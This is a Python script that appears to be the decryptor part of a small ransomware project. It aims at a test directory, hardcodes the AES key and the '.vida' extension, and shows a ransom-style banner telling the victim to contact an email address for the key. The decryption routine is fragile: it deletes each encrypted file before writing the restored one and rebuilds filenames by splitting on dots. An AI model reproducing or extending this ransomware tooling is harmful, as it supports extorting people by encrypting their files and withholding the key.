#!/bin/env python3

#import lib
import os, pyaes

# vars of control
dir = '/home/vida/teste_ransomware'
ext = '.vida'
key = b'29iskskm992212w3'
email = 'yourEmail@gmail.com'

def decrypt(key_decrypt):
	os.chdir(dir)

	# list encrypted files
	for folder, subfolders, archives in os.walk(dir):
		for archive in archives:
			if archive.endswith(ext):
		
				# get original path
				target = os.path.join(os.path.realpath(folder), archive)

				# get encrypted data
				with open(target, 'rb') as file:
					data = file.read()

				os.remove(target) # remove encrypted files

				# set AES algorithm
				aes = pyaes.AESModeOfOperationCTR(key_decrypt)
				decrypt_data = aes.decrypt(data)

				# get original name
				original_ext = target.split('.')
				original_name = original_ext[0] + '.' + original_ext[1]

				# generate original file
				with open(original_name, 'wb') as file:
					file.write(decrypt_data)

def banner(msg):
	print(f"""
      ,  ,  , , ,
     <(__)> | | |
     | \/ | \_|_/
     \^  ^/   |
     /\--/\  /|
    /  \/  \/ |

   {msg}	
""")
if __name__ == "__main__":
	get_key = input("Enter key for decrypt your files: ")
	if get_key == key.decode('ascii'):
		decrypt(key)
		banner("[+] Success - your data has been released")
	else:
		banner(f"[-] Fail - invalid key, contact {email}")
